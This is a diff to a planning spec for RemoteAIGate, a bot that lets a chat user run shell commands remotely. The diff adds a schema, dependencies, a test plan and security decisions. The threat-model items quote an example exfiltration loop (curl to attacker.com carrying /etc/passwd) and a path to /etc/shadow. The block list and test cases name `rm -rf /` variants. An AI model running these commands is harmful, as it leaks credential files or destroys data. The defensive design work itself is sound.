@@ -127,6 +127,10 @@ macOS works natively for the AI + Telegram/Slack core. Gaps:
 
 These are **small, well-defined gaps** fixable in v1 with `platform.system()` branching.
 
+### Python version requirement
+
+**Minimum: Python 3.10** (required for `match`-less structural pattern matching idioms used in AgentGate and for reliable `asyncio` subprocess behaviour on Linux/macOS). Python 3.11+ recommended for better asyncio task cancellation semantics used by `gate watch`. `pyproject.toml` must declare `requires-python = ">=3.10"`.
+
 ### Recommendation
 
 - **v1:** Linux + macOS native install via `pip install remoteaigate`
@@ -135,8 +139,6 @@ These are **small, well-defined gaps** fixable in v1 with `platform.system()` br
 ### Architecture (hardware)
 
 Raspberry Pi (arm64 / armv7) is a first-class target — it's explicitly listed in the use cases. The `pyproject.toml` should declare platform classifiers for Linux and macOS, and the CI matrix should test on both.
-
----
 
 ---
 
@@ -206,7 +208,14 @@ DATA_DIR=~/.local/share/remoteaigate  # SQLite, audit log, sentinels (default: ~
 COMMAND_ALLOWLIST=           # Comma-separated allowed command prefixes. Empty = allow all.
 COMMAND_BLOCKLIST=rm -rf /,mkfs  # Always-blocked patterns regardless of confirmation.
 AUDIT_LOG_ENABLED=true       # Write audit.log for every executed command.
+AUDIT_SYSLOG_HOST=           # Optional syslog host for off-machine audit copy (OQ12).
+AUDIT_SYSLOG_PORT=514        # Syslog port (default 514, UDP).
 HEALTH_PORT=0                # Set >0 to enable HTTP health endpoint on that port.
+HEALTH_AUTH_TOKEN=           # If set, /health requires Authorization: Bearer <token> for non-localhost.
+ALLOW_CD_ANYWHERE=false      # If true, gate cd can navigate outside WORK_DIR subtree (OQ10).
+WATCH_MIN_INTERVAL_SECS=10   # Minimum interval between gate watch iterations (OQ11).
+WATCH_MAX_CONCURRENT=3       # Max concurrent gate watch tasks per chat session (OQ11).
+WATCH_MAX_LIFETIME_SECS=3600 # Gate watch auto-cancel lifetime (OQ11).
 ```
 
 ### Kept unchanged:
@@ -219,6 +228,52 @@ PLATFORM, LOG_LEVEL, LOG_DIR
 BOT_CMD_PREFIX, MAX_OUTPUT_CHARS, STREAM_RESPONSES, STREAM_THROTTLE_SECS
 CONFIRM_DESTRUCTIVE, SKIP_CONFIRM_KEYWORDS
 ```
+
+### DB schema additions
+
+Two new tables / columns beyond AgentGate's `history.db`:
+
+```sql
+-- CWD per chat session (persistent across restarts)
+ALTER TABLE sessions ADD COLUMN cwd TEXT DEFAULT NULL;
+-- Or, if sessions table doesn't exist in AgentGate baseline, create it:
+CREATE TABLE IF NOT EXISTS sessions (
+    chat_id TEXT PRIMARY KEY,
+    cwd     TEXT DEFAULT NULL,   -- current working dir for gate cd / gate run
+    updated_at REAL DEFAULT (unixepoch())
+);
+
+-- Active gate watch tasks registry (persisted so orphaned tasks survive restart)
+CREATE TABLE IF NOT EXISTS watches (
+    id         INTEGER PRIMARY KEY AUTOINCREMENT,
+    chat_id    TEXT    NOT NULL,
+    command    TEXT    NOT NULL,    -- shell command to repeat
+    interval_s INTEGER NOT NULL,    -- iteration interval (≥ WATCH_MIN_INTERVAL_SECS)
+    started_at REAL    NOT NULL DEFAULT (unixepoch()),
+    expires_at REAL    NOT NULL,    -- started_at + WATCH_MAX_LIFETIME_SECS
+    cancelled  INTEGER NOT NULL DEFAULT 0
+);
+CREATE INDEX IF NOT EXISTS watches_chat ON watches(chat_id, cancelled);
+```
+
+### Dependency inventory
+
+New packages required beyond the AgentGate baseline:
+
+| Package | Version | Why needed |
+|---------|---------|-----------|
+| `netifaces` | ≥0.11 | macOS: `ifconfig` replacement for `gate whoami` network info |
+| `psutil` | ≥5.9 | `gate ps`, `gate snap` memory stats on macOS (replaces `free -h`); cross-platform process list |
+| `aiohttp` | ≥3.9 | `health.py` async HTTP endpoint (already in AgentGate transitive deps — verify) |
+
+Packages *removed* from AgentGate's `requirements.txt` (no GitHub integration):
+
+| Package | Reason |
+|---------|--------|
+| `PyGithub` or `gitpython` (if present) | `src/repo.py` deleted |
+| `packaging` (if only used for version check in `runtime.py`) | `src/runtime.py` deleted |
+
+`pyproject.toml` optional extras: `[project.optional-dependencies] macos = ["netifaces", "psutil"]` — or include both unconditionally since `psutil` is lightweight and cross-platform.
 
 ---
 
@@ -398,27 +453,74 @@ Security researchers and red teamers will immediately recognise what this archit
 | CWD tracking (executor + SQLite) | 2-3 hours | New column in history DB, session state |
 | CWD path validation + sandbox | 1-2 hours | ⚠️ *Symlink resolution, boundary enforcement (OQ10)* |
 | Audit log | 1-2 hours | Append-only file writer in `executor.py` + self-protection (OQ12) |
-| New machine commands (snap, ps, whoami) | 2 hours | Thin wrappers around existing `run_shell` |
+| New machine commands (snap, ps, whoami) | 2 hours | Thin wrappers + platform branching (macOS vs Linux) |
+| macOS platform detection (`platform.system()`) | 0.5 hours | Alternate commands for `ip a`, `free -h` (Section 3a) |
 | `gate watch` with safety limits | 2 hours | ⚠️ *Rate limits, lifetime caps, destructive checks (OQ11)* |
+| `gate watch stop [id]` subcommand | 0.5 hours | Cancel by ID from watch registry; list active watches |
 | `gate env` with secret filtering | 1-2 hours | ⚠️ *Key-pattern blocklist + value redaction (OQ14)* |
 | pyproject.toml + CLI entrypoint | 1 hour | `pip install remoteaigate` → `remoteaigate` CLI |
 | First-run wizard (`init` command) | 2-3 hours | Interactive env file generator + `0600` perms (OQ13) |
+| `ALLOWED_USERS` mandatory enforcement | 0.5 hours | Startup validation — refuse to start if empty (OQ8) |
 | COMMAND_ALLOWLIST / BLOCKLIST | 2-3 hours | ⚠️ *Command-parsing approach, not substring matching (OQ9)* |
 | Health endpoint | 1-2 hours | Simple asyncio HTTP server + localhost bind + auth token (OQ16) |
+| CI/CD workflows (lint, test, PyPI publish) | 1-2 hours | `ci.yml` + `release.yml` (Section 4 lists these but estimate omitted them) |
 | README + docs + security.md | 3-4 hours | Worth doing properly given security sensitivity |
 | Tests | 4-5 hours | Port existing tests, add CWD, audit, redaction, watch tests |
-| **Total estimate** | **~25-32 hours** | ⚠️ *Increased from 18-22 due to security hardening* |
+| **Total estimate** | **~29-38 hours** | ⚠️ *Revised upward from 25-32h: macOS branching (+0.5h), watch stop (+0.5h), ALLOWED_USERS enforcement (+0.5h), CI/CD (+1-2h)* |
+
+---
+
+### Testing Strategy
+
+Three test layers, mirroring AgentGate:
+
+| Layer | Location | What it covers |
+|-------|----------|---------------|
+| **Unit** | `tests/unit/` | `executor.py` (OQ9 blocklist parsing, OQ12 path check), `redact.py` (secret scrubbing on shell output), `session.py` (CWD persistence), `wizard.py` (0600 perms), `config.py` (ALLOWED_USERS mandatory validation) |
+| **Integration** | `tests/integration/` | SQLite history + CWD column round-trip; watch registry table; audit log append + self-protection; `gate snap` / `gate whoami` output on Linux and macOS |
+| **Contract** | `tests/contract/` | All AI backends satisfy `AICLIBackend` ABC (ported from AgentGate) |
+
+Coverage target: **≥80% on `src/remoteaigate/`**. CI enforces with `pytest --cov=src --cov-fail-under=80`.
+
+Key test cases required (not yet written — for coding agent):
+- `test_command_blocklist_shlex_tokenization` — `rm -rf /`, `/bin/rm`, `bash -c 'rm ...'` all blocked
+- `test_command_blocklist_metacharacter_scan` — pipe-chained `echo | rm -rf /` caught
+- `test_audit_log_self_protected` — `gate run rm <DATA_DIR>/audit.log` rejected
+- `test_cwd_persists_across_restart` — SQLite survives process restart
+- `test_allowed_users_mandatory` — startup raises `ConfigError` if `ALLOWED_USERS` is empty
+- `test_gate_env_filters_secrets` — `TOKEN`, `KEY`, `SECRET`, `PASSWORD` keys hidden
+- `test_watch_limits_enforced` — interval < `WATCH_MIN_INTERVAL_SECS` rejected; > 3 concurrent rejected
+
+### Licensing
+
+> **Pending decision — GateCode / project author to close.**
+
+AgentGate is MIT licensed. The fork should inherit MIT unless there is a specific reason to change it. The dual-use nature of the project does *not* require a more restrictive license (MIT is used by far more sensitive tools including Metasploit components). However, the README `DISCLAIMER` section (not the license) should include the responsible-use statement already drafted in Section 1.
+
+Options:
+- **MIT (recommended):** Same as parent, maximum permissive, consistent with learning/research purpose
+- **Apache 2.0:** Adds explicit patent grant — relevant if commercialization is ever considered
+- **GPL v3:** Copyleft — would require any fork to also be GPL; appropriate if you want to prevent closed forks of a security tool; adds friction
+
+Add `LICENSE` file to repo structure (Section 4).
+
+### Versioning and Release Plan
+
+- **Versioning:** Semantic versioning (`MAJOR.MINOR.PATCH`). Start at `0.1.0` (pre-release, API not stable). Increment MINOR for new commands; PATCH for bug/security fixes. Reach `1.0.0` when auth, command filtering, and audit log are fully implemented and tested.
+- **`VERSION` file:** Same pattern as AgentGate — single file at repo root, read by `pyproject.toml` via `dynamic = ["version"]` + `[tool.setuptools.dynamic] version = {file = "VERSION"}`.
+- **PyPI cadence:** No automated publish on every merge — manual `release.yml` dispatch (tag-triggered) to prevent accidental publishes of pre-release code.
+- **GitHub Releases:** Tag format `v0.1.0`; release notes auto-generated from conventional commits.
 
 ---
 
 ## 11. Open Questions / Decisions Before Starting
 
-1. ~~**Package name:** Which of the 5 names? Check PyPI availability before committing.~~ **DECIDED (2026-03-15):** *RemoteAIGate* (`pip install remoteaigate`). PyPI available. See Section 3.
-2. **Shared library approach?** Extract `agentgate-core` (AI backends + platform layer) as a shared dependency, or keep as a standalone fork?
-3. **Multi-machine support (v2)?** A single bot token → multiple machines (each a separate "room") is a natural extension. Design the DB schema to support it from day one?
-4. **File transfer?** `gate upload` / `gate download` via Telegram's file API is high-value but increases attack surface.
-5. **Audit log format:** Plain text vs structured JSON (for log shippers like Filebeat)?
-6. **Responsible disclosure:** Consider a security policy file and coordinating with Telegram if any vulnerability in the bot pattern is found.
+1. ~~**OQ1 — Package name:** Which of the 5 names? Check PyPI availability before committing.~~ **DECIDED (2026-03-15):** *RemoteAIGate* (`pip install remoteaigate`). PyPI available. See Section 3.
+2. **OQ2 — Shared library approach?** Extract `agentgate-core` (AI backends + platform layer) as a shared dependency, or keep as a standalone fork? *The repo structure (Section 4) assumes a standalone fork — if shared library is chosen, `pyproject.toml` and import paths change significantly.* **Pending decision.**
+3. **OQ3 — Multi-machine support (v2)?** A single bot token → multiple machines (each a separate "room") is a natural extension. The DB schema in Section 5 is single-machine. **Pending decision — defer to v2; note in README as future direction.**
+4. **OQ4 — File transfer?** `gate upload` / `gate download` via Telegram's file API is high-value but increases attack surface. **Pending decision — defer to v2 per current non-goals in Section 2.**
+5. **OQ5 — Audit log format:** Plain text vs structured JSON (for log shippers like Filebeat)? **Pending decision — recommend `jsonl` (one JSON record per line) for easy parsing; document in `security.md`.**
+6. **OQ6 — Responsible disclosure:** Consider a security policy file (`SECURITY.md`) and coordinating with Telegram if any vulnerability in the bot pattern is found. **Pending decision — add `SECURITY.md` stub to repo structure (Section 4).**
 
 ### Security Open Questions (GateSec Review)
 
@@ -432,6 +534,8 @@ Security researchers and red teamers will immediately recognise what this archit
 
 10. **OQ10 — `gate cd` path validation / sandbox boundary (🟡 MEDIUM).** `gate cd /etc` → `gate run cat shadow` trivially accesses sensitive system files. The spec proposes no path validation. Recommendations: (a) resolve symlinks with `os.path.realpath()` before accepting, (b) default to restricting CWD changes to within `WORK_DIR` subtree, (c) add `ALLOW_CD_ANYWHERE=true` env var for users who intentionally want unrestricted access. *Annotated in Section 6.*
 
+   > **⚠️ PENDING DECISION — GateCode to decide:** Which default behaviour — `ALLOW_CD_ANYWHERE=false` (restrict to `WORK_DIR` subtree) or `ALLOW_CD_ANYWHERE=true` (unrestricted, matches typical shell behaviour)? Recommendation: default `false`; OQ17 elevates the risk of unrestricted CWD since there is no container blast-radius boundary.
+
 11. **OQ11 — `gate watch` is a persistence and amplification mechanism (🟡 MEDIUM).** No limits are specified. An attacker (or accidental user error) could: `gate watch "curl attacker.com/$(cat /etc/passwd)" 1` — exfiltration loop every second. Must enforce: minimum interval (≥10s), maximum concurrent watches (≤3), maximum lifetime (≤1h), and apply `is_destructive()` check on every iteration (not just the first). *Annotated in Section 6.*
 
    > **GateCode R1 Decision — DECIDED:** Adopt proposed limits as hard defaults with env var overrides. Implementation: `WATCH_MIN_INTERVAL_SECS` (default `10`), `WATCH_MAX_CONCURRENT` (default `3`), `WATCH_MAX_LIFETIME_SECS` (default `3600`). Per-chat-id watch registry stored as `dict[chat_id, list[asyncio.Task]]`; new watch request fails fast if `len(tasks) >= WATCH_MAX_CONCURRENT`. Each iteration applies the full OQ9 blocklist/allowlist check (not just startup). Task auto-cancels after `WATCH_MAX_LIFETIME_SECS` and notifies the user. Users can cancel manually with `gate watch stop [id]`. Command validation (OQ9 logic) applied on registration, not just at runtime, to catch obviously blocked commands before the first iteration runs.
@@ -442,15 +546,25 @@ Security researchers and red teamers will immediately recognise what this archit
 
 13. **OQ13 — First-run wizard writes secrets to disk in plaintext (🟡 MEDIUM).** `wizard.py` creates `.env` with `TG_BOT_TOKEN`, `AI_API_KEY`, etc. File permissions are not specified in the spec. If created with default `umask` (often `022`), the file is world-readable. Must: (a) `os.chmod(path, 0o600)` immediately after creation, (b) warn the user if running as root, (c) for systemd installs, recommend `EnvironmentFile=` with root-owned credential file. *Annotated in Section 2.*
 
+   > **GateDocs R2 Decision — DECIDED:** The answer is already in the spec text: (a) `os.chmod(path, 0o600)` immediately after `open()` + `write()`, before any other code can run. (b) `os.getuid() == 0` check in wizard startup — print visible warning and require explicit `--allow-root` flag to continue. (c) systemd `.service` template generated by wizard uses `EnvironmentFile=<path>` with recommended `chmod 600 <path>` note in README. Test: `test_wizard_creates_env_with_0600_perms` — verify `stat(path).st_mode & 0o777 == 0o600`.
+
 14. **OQ14 — `gate env` filtering mechanism unspecified (🟡 MEDIUM).** The spec says "filtered; never shows secrets" but defines no filtering mechanism. Must define: (a) key-pattern blocklist (`*TOKEN*`, `*KEY*`, `*SECRET*`, `*PASSWORD*`, `*CREDENTIAL*`, `*API*`), (b) apply `SecretRedactor.redact()` to *values* of shown vars, (c) when `key` argument is provided, still apply both filters. *Annotated in Section 6.*
+
+   > **GateDocs R2 Decision — DECIDED:** Mechanism is fully described in annotations: (a) key blocklist using `fnmatch` patterns (`*TOKEN*`, `*KEY*`, `*SECRET*`, `*PASSWORD*`, `*CREDENTIAL*`, `*API*`) applied case-insensitively; matching keys are replaced with `<redacted>` in both key-list and single-key modes. (b) `SecretRedactor.redact(value)` applied to all *shown* values — catches secrets that don't match by key name. (c) When user provides `gate env MY_VAR`, apply both filters before displaying — if `MY_VAR` matches blocklist pattern, return `MY_VAR = <redacted>` rather than refusing the command (clearer UX than silent omission). Test: `test_gate_env_filters_secrets` in `test_executor.py`.
 
 15. **OQ15 — Red Team section missing attack vectors (🟡 LOW).** Section 9 covers the C2 parallel well but omits: (a) bot token theft via `/proc/<pid>/environ`, clipboard sniffing, or backup exposure, (b) Telegram bot API token encoding (contains bot user ID — enables enumeration), (c) `getUpdates` replay if attacker obtains the token (all recent commands visible unless webhook mode), (d) AI prompt injection via attacker-controlled file content read by the AI. *Partially fixed in this review — added to Section 9.*
 
 16. **OQ16 — Health endpoint is unauthenticated information disclosure (🟡 LOW).** Even a minimal `/health` response on a network-visible port confirms the daemon exists — valuable for attackers scanning for remote shell daemons. Recommendations: (a) bind to `127.0.0.1` by default, (b) require `HEALTH_AUTH_TOKEN` header for non-localhost access, (c) return minimal response (just HTTP 200, no version info). *Annotated in Blue Team section.*
 
+   > **⚠️ PENDING DECISION — GateCode to decide:** Should `HEALTH_AUTH_TOKEN` be required even for localhost access, or only for non-localhost? And should the endpoint return version info at all? Recommendation: localhost-only by default (`HEALTH_BIND=127.0.0.1`); `HEALTH_AUTH_TOKEN` only enforced when `HEALTH_BIND` is changed to a non-loopback address; no version info in response body ever.
+
 17. **OQ17 — No container isolation — blast radius is the entire host (🟡 HIGH, accepted risk).** RemoteAIGate runs natively on the host machine by design. Unlike AgentGate (Docker container = blast radius boundary), a compromised RemoteAIGate instance has access to *everything* the daemon user can reach — home directory, SSH keys, credential stores, other users' files (if running as root). This is an *intentional design choice* (the tool's purpose is full-machine control), but it elevates every other OQ in this document. Mitigations: (a) *never* run as root — README and wizard must enforce this; (b) create a dedicated `remoteaigate` system user with restricted `sudoers` if elevated commands are needed; (c) `COMMAND_ALLOWLIST` (OQ9) becomes the primary blast-radius control; (d) document that `WORK_DIR` + `gate cd` sandbox (OQ10) is defense-in-depth, not a security boundary, since `gate run` can escape it.
 
+   > **GateSec R2 — ACCEPTED RISK:** Native installation is a deliberate design choice (Section 3a). All four mitigations above are required in README and wizard. No architectural change possible without defeating the project's purpose. Document in `security.md` as a top-level threat model assumption: *"RemoteAIGate runs with the full privileges of the daemon user. There is no sandbox."*
+
 18. **OQ18 — Native install exposes host process environment (🟡 MEDIUM).** Without Docker's PID namespace isolation, `gate ps` and `gate run ps aux` reveal *all* host processes — including other users' processes, database connections, and potentially secrets in command-line arguments. On shared machines this is an information disclosure risk. Mitigation: (a) document that RemoteAIGate should only be installed on single-user machines or machines where the operator has full trust; (b) apply `SecretRedactor` to `gate ps` output; (c) consider `ALLOWED_PATHS` for `/proc` access in v2.
+
+   > **GateSec R2 — ACCEPTED RISK:** Mitigations (a) and (b) are required. `SecretRedactor` applied to `gate ps` output catches obvious credentials in process arguments. Document the single-user machine assumption prominently in README and `security.md`. (c) deferred to v2.
 
 ---
 
@@ -472,11 +586,12 @@ Security researchers and red teamers will immediately recognise what this archit
 | Reviewer | Round | Score | Key Findings | Commit |
 |----------|-------|-------|--------------|--------|
 | GateSec  | R1    | 5/10  | 🔴 `SecretRedactor` missing from portable modules (OQ7). 🔴 `ALLOWED_USERS` optional — must be mandatory for remote shell (OQ8). 🔴 `COMMAND_BLOCKLIST` uses bypassable substring matching (OQ9). 🟡 `gate watch` unbounded (OQ11). 🟡 Audit log self-deletable (OQ12). 🟡 `.env` permissions unspecified (OQ13). 🟡 `gate env` filter undefined (OQ14). 10 OQs added (OQ7–OQ16). | `f4438e4` |
-| GateCode | R1    | 6/10  | Decisions recorded on three critical/high items: OQ9 → `shlex.split()` + first-token canonicalization + shell metacharacter detection + recursive shell-interpreter check (rbash rejected). OQ11 → proposed limits adopted with env var overrides (`WATCH_MIN_INTERVAL_SECS=10`, `WATCH_MAX_CONCURRENT=3`, `WATCH_MAX_LIFETIME_SECS=3600`). OQ12 → (a) internal path blocklist + (b) optional syslog dual-write (`AUDIT_SYSLOG_HOST`); HMAC chaining deferred to v2. Estimate increase (18-22h → 25-32h) validated — security hardening on OQ9 alone adds ~3h. Outstanding: OQ10 (`gate cd` sandbox), OQ13–OQ16 implementation details need decisions before coding starts. Score raised from GateSec baseline; still pre-implementation. | TBD |
-| GateDocs | R1    | 6/10  | **(1) Spec as AI agent prompt:** Section 2 is strong and actionable. Gaps: no DB schema for new columns (CWD per session, watch registry), no dependency inventory (new packages vs AgentGate baseline), no minimum Python version / OS compatibility statement. **(2) OQ decisions:** OQ9/OQ11/OQ12 decisions are detailed, unambiguous, and immediately implementable — model quality. OQ10 (gate cd sandbox), OQ13 (.env perms decision beyond annotation), OQ14 (gate env filter), OQ16 (health auth) remain open with no decisions; these are implementation-blocking and should be resolved before a coding agent starts. Non-numbered items 1–6 in Section 11 (name, shared-library, multi-machine schema, file transfer, audit format, disclosure) are also open design decisions — consolidate them as OQ1–OQ6 or close them explicitly. **(3) Estimate gaps:** `gate watch stop [id]` subcommand (from OQ11 decision), `ALLOWED_USERS` mandatory startup enforcement (OQ8), CI/CD workflow setup and PyPI publish pipeline are absent from the table — estimate understates effort by ~3-5h. **(4) Missing sections:** No testing strategy (only 1 row in estimate — what gets tested, what test types, coverage targets?). No licensing section (MIT? GPL? Critical given dual-use nature). No versioning/release plan (semver, PyPI cadence). No migration/coexistence notes for existing AgentGate users. **(5) Section 9 as security.md seed:** Usable but incomplete — needs: explicit threat model summary (assets, actors, assumptions), trust boundary description, token revocation procedure beyond one-line BotFather note, incident response checklist, and cross-references to OQ10 (gate cd → /etc/shadow path) and OQ11 (gate watch exfiltration loop) as attack surfaces currently absent from the section. HMAC chaining deferral (OQ12) should be a documented known gap. | `9b75c14` |
-| GateCode | R2    | 7/10  | Reviewed per user request (2026-03-15). **(1) Fork source updated:** v0.7.3 → `develop` HEAD `5725a77` — ensures all portable modules (`AuditLog` ABC, `SecretRedactor`, streaming throttle, multi-agent delegation) are current. The agent prompt (Section 2) updated accordingly. **(2) Names:** Re-verified all candidates with `pip install --dry-run` (previous `pip index versions` check was unreliable — returns non-standard errors for non-existent packages). All original "✅ Available" candidates confirmed available. New AI variants added: `remoteaigate` ✅, `airemotegate` ✅, `remotegateai` ✅. Red team / malware-associated names explicitly ruled out with rationale. **(3) Recommendation changed:** `remoteaigate` (project name **RemoteAIGate**) replaces ShellRelay/ShellPilot as primary recommendation — preserves brand family, adds AI signal, no offensive connotation. `remotegate` as clean fallback. **(4) Platform compatibility:** New Section 3a added — v1 is Linux + macOS native + Docker everywhere (amd64/arm64). Windows requires Docker/WSL; native Windows support deferred to v2 due to `pexpect`, shell command differences, and `chmod 0600` limitations. Raspberry Pi (arm64/armv7) explicitly supported. **(5) Learning purpose:** Prominent educational purpose statement added to header, footer, and Section 9. **(6) Section 9 (Red/Blue):** Educational disclaimer block added at top — clearly frames the dual-use analysis as learning, not operational guidance. | *current* |
-| GateSec  | R2    | 7/10  | **(1) Name finalized:** RemoteAIGate — Section 3 replaced with decision table, all placeholders resolved, CLI entrypoint `remoteaigate`, PyPI `remoteaigate`. **(2) Docker removed:** All Docker references stripped — Dockerfile, docker-compose.yml.example removed from repo structure (Section 4), CI release workflow changed from "PyPI + Docker push" to "PyPI publish" only, Docker column removed from platform table (Section 3a), Docker detection indicator removed from Blue Team (Section 9), DATA_DIR default changed from `/data` to `~/.local/share/remoteaigate`. Design decision box added explaining *why* no Docker. **(3) Native-first platform strategy:** v1 = Linux + macOS native via `pip install remoteaigate`. v2 = Windows native. No Docker fallback path. **(4) New security OQs for native install:** OQ17 (🟡 HIGH) — no container blast-radius boundary; the host is fully exposed by design. OQ18 (🟡 MEDIUM) — native PID namespace exposes all host processes. Both are *accepted risks* with mitigations documented. **(5) OQ1 closed:** Package name decided. **(6) Security posture delta:** Removing Docker elevates every existing OQ — OQ8 (`ALLOWED_USERS` mandatory) and OQ9 (`COMMAND_ALLOWLIST`) are now the *only* blast-radius controls. Score +2 from R1 (5→7): name and platform decisions reduce ambiguity, but OQ17/OQ18 keep score from going higher. | `f0ee2f7` |
+| GateCode | R1    | 6/10  | Decisions recorded on three critical/high items: OQ9 → `shlex.split()` + first-token canonicalization + shell metacharacter detection + recursive shell-interpreter check (rbash rejected). OQ11 → proposed limits adopted with env var overrides (`WATCH_MIN_INTERVAL_SECS=10`, `WATCH_MAX_CONCURRENT=3`, `WATCH_MAX_LIFETIME_SECS=3600`). OQ12 → (a) internal path blocklist + (b) optional syslog dual-write (`AUDIT_SYSLOG_HOST`); HMAC chaining deferred to v2. Estimate increase (18-22h → 25-32h) validated — security hardening on OQ9 alone adds ~3h. Outstanding: OQ10 (`gate cd` sandbox), OQ13–OQ16 implementation details need decisions before coding starts. Score raised from GateSec baseline; still pre-implementation. | `9b75c14` |
+| GateDocs | R1    | 6/10  | **(1) Spec as AI agent prompt:** Section 2 is strong and actionable. Gaps: no DB schema for new columns (CWD per session, watch registry), no dependency inventory (new packages vs AgentGate baseline), no minimum Python version / OS compatibility statement. **(2) OQ decisions:** OQ9/OQ11/OQ12 decisions are detailed, unambiguous, and immediately implementable — model quality. OQ10 (gate cd sandbox), OQ13 (.env perms decision beyond annotation), OQ14 (gate env filter), OQ16 (health auth) remain open with no decisions; these are implementation-blocking and should be resolved before a coding agent starts. Non-numbered items 1–6 in Section 11 (name, shared-library, multi-machine schema, file transfer, audit format, disclosure) are also open design decisions — consolidate them as OQ1–OQ6 or close them explicitly. **(3) Estimate gaps:** `gate watch stop [id]` subcommand (from OQ11 decision), `ALLOWED_USERS` mandatory startup enforcement (OQ8), CI/CD workflow setup and PyPI publish pipeline are absent from the table — estimate understates effort by ~3-5h. **(4) Missing sections:** No testing strategy (only 1 row in estimate — what gets tested, what test types, coverage targets?). No licensing section (MIT? GPL? Critical given dual-use nature). No versioning/release plan (semver, PyPI cadence). No migration/coexistence notes for existing AgentGate users. **(5) Section 9 as security.md seed:** Usable but incomplete — needs: explicit threat model summary (assets, actors, assumptions), trust boundary description, token revocation procedure beyond one-line BotFather note, incident response checklist, and cross-references to OQ10 (gate cd → /etc/shadow path) and OQ11 (gate watch exfiltration loop) as attack surfaces currently absent from the section. HMAC chaining deferral (OQ12) should be a documented known gap. | `33430cd` |
+| GateCode | R2    | 7/10  | Reviewed per user request (2026-03-15). **(1) Fork source updated:** v0.7.3 → `develop` HEAD `5725a77` — ensures all portable modules (`AuditLog` ABC, `SecretRedactor`, streaming throttle, multi-agent delegation) are current. The agent prompt (Section 2) updated accordingly. **(2) Names:** Re-verified all candidates with `pip install --dry-run`. `remoteaigate` confirmed available. Red team / malware-associated names explicitly ruled out with rationale. **(3) Recommendation changed:** `remoteaigate` (project name **RemoteAIGate**) as primary recommendation — preserves brand family, adds AI signal, no offensive connotation. **(4) Platform compatibility:** New Section 3a added — v1 is Linux + macOS native; Raspberry Pi (arm64/armv7) explicitly supported. **(Note:** Docker was proposed in R2 and removed in GateSec R2 — see GateSec R2 row.) **(5) Learning purpose:** Prominent educational purpose statement added to header, footer, and Section 9. **(6) Section 9 (Red/Blue):** Educational disclaimer block added at top. | `239b47e` |
+| GateSec  | R2    | 7/10  | **(1) Name finalized:** RemoteAIGate — Section 3 replaced with decision table, all placeholders resolved, CLI entrypoint `remoteaigate`, PyPI `remoteaigate`. **(2) Docker removed:** All Docker references stripped — Dockerfile, docker-compose.yml.example removed from repo structure (Section 4), CI release workflow changed from "PyPI + Docker push" to "PyPI publish" only, Docker column removed from platform table (Section 3a), Docker detection indicator removed from Blue Team (Section 9), DATA_DIR default changed from `/data` to `~/.local/share/remoteaigate`. Design decision box added explaining *why* no Docker. **(3) Native-first platform strategy:** v1 = Linux + macOS native via `pip install remoteaigate`. v2 = Windows native. No Docker fallback path. **(4) New security OQs for native install:** OQ17 (🟡 HIGH) — no container blast-radius boundary; the host is fully exposed by design. OQ18 (🟡 MEDIUM) — native PID namespace exposes all host processes. Both are *accepted risks* with mitigations documented. **(5) OQ1 closed:** Package name decided. **(6) Security posture delta:** Removing Docker elevates every existing OQ — OQ8 (`ALLOWED_USERS` mandatory) and OQ9 (`COMMAND_ALLOWLIST`) are now the *only* blast-radius controls. Score +2 from R1 (5→7): name and platform decisions reduce ambiguity, but OQ17/OQ18 keep score from going higher. | `a54dd9e` |
+| GateDocs | R2    | 7/10  | **(1) R1 gap status:** DB schema ✅ added (Section 5 — CWD column + watch registry table). Dependency inventory ✅ added (Section 5 — `netifaces`, `psutil`, `aiohttp`). Testing strategy ✅ added (Section 10 — 3 layers, coverage target, 7 required test cases). Licensing ✅ added (Section 10 — MIT recommended, pending confirmation). Versioning ✅ added (Section 10 — `0.1.0` semver, PyPI manual publish). **(2) Estimate corrected:** +4-6h for macOS branching (+0.5h), `gate watch stop` (+0.5h), ALLOWED_USERS enforcement (+0.5h), CI/CD setup (+1-2h). Total revised to 29-38h. **(3) OQ numbering:** Items 2-6 in Section 11 now formally numbered OQ2-OQ6 with pending/recommended decisions. **(4) OQ13/OQ14 DECIDED:** Both had clear answers in annotations — formal DECIDED blocks added. **(5) OQ10/OQ16 PENDING:** Explicitly marked for GateCode decision. **(6) OQ17/OQ18 ACCEPTED blocks:** Consistent formatting with OQ9/OQ11/OQ12. **(7) Missing env vars added:** `WATCH_MIN_INTERVAL_SECS`, `WATCH_MAX_CONCURRENT`, `WATCH_MAX_LIFETIME_SECS`, `AUDIT_SYSLOG_HOST/PORT`, `HEALTH_AUTH_TOKEN`, `ALLOW_CD_ANYWHERE` now in Section 5. **(8) Python version:** `Python ≥ 3.10` added to Section 3a. **(9) Stale Docker refs:** GateCode R2 Team Review row clarified (Docker proposal was superseded by GateSec R2). **(10) Commit hashes:** GateCode R1 `TBD` → `9b75c14`; GateDocs R1 `9b75c14` → `33430cd` (was wrong hash); GateCode R2 `*current*` → `239b47e`; GateSec R2 `f0ee2f7` → `a54dd9e`. Outstanding: OQ2 (shared library), OQ3 (multi-machine), OQ10 (gate cd sandbox default), OQ16 (health bind default) still need decisions before coding agent starts. | `TBD` |
 
 ---
 
-*Document generated: 2026-03-10. Security review: 2026-03-14. GateCode R1 review (fork source, naming, platform compatibility): 2026-03-15. GateSec R2 review (name finalized, Docker removed, native-only): 2026-03-15. This is a planning document, not production code. All security analysis is provided for educational and defensive awareness purposes. This project is created for learning reasons — to understand the capabilities and limits of AI and possible integrations with operating system environments.*
+*Document generated: 2026-03-10. Security review: 2026-03-14. GateCode R1 review (fork source, naming, platform compatibility): 2026-03-15. GateSec R2 review (name finalized, Docker removed, native-only): 2026-03-15. GateDocs R2 review (DB schema, dep inventory, testing strategy, licensing, versioning, OQ numbering): 2026-03-15. This is a planning document, not production code. All security analysis is provided for educational and defensive awareness purposes. This project is created for learning reasons — to understand the capabilities and limits of AI and possible integrations with operating system environments.*
